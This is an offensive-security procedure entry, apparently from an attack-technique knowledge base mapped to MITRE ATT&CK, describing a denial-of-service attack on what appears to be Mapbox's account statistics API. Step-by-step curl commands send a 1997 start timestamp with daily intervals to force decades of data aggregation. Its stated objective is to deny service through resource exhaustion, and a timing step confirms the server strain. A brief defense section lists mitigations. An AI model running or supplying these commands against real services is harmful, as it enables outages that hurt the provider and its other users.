---
id: proc-mapbox-early-dates
tags:
  - historical-data
  - dos
  - parameter-abuse
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-mapbox-early-dates]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:26:37.045Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[OS Exhaustion Flood]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Test-Early-Dates-for-Excessive-Processing

## Summary

This procedure tests the endpoint with very early start dates (e.g., 1997) to force processing of potentially vast historical datasets, amplifying the DoS impact.

## Description

Setting the 'period' start to an early timestamp like May 1997 with 'interval=day' causes the backend to aggregate data over decades, leading to extreme resource use. This was identified as a follow-up issue, resulting in server strain or crashes. Targets the authenticated web API.

## Requirements

1. Authenticated session
2. Early Unix timestamp (e.g., 860000000000 for 1997)
3. Monitoring for response delays

## Defense

Defensive measures and detection strategies:

- Enforce minimum start date (e.g., account creation)
- Limit total data points returned
- Alert on queries with periods >1 year

## Objectives

1. Trigger historical data aggregation
2. Cause prolonged backend processing
3. Deny service via exhaustion

## Instructions

### Step 1: Set Early Period

**Context**: Use interval=day with start from 1997.

**Command** ([[commands/curl-mapbox-early-dates]]):
```bash
curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=day&period=860000000000,1462370883143&metrics=countries,browsers,hosts,maps,version&services=mapview,tile,static,geocode,permanentgeocode,directions,surface&_=1462370883155" -o early_response.json
```

> Expected: Delay or failure due to massive dataset; response may exceed limits.

### Step 2: Monitor Impact

**Context**: Time the request to gauge load.

**Command** ([[commands/curl]]):
```bash
time curl -H "Cookie: session=your_session_cookie" "https://www.mapbox.com/core/statistics/v1/yourusername/account?interval=day&period=860000000000,1462370883143&..."
```

> Expected: Execution time >30 seconds indicates exhaustion.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques

- [[OS Exhaustion Flood]]

## Commands Used

- [[commands/curl-mapbox-early-dates]]

## Tools Used


## Tags

- historical-data
- dos
- parameter-abuse
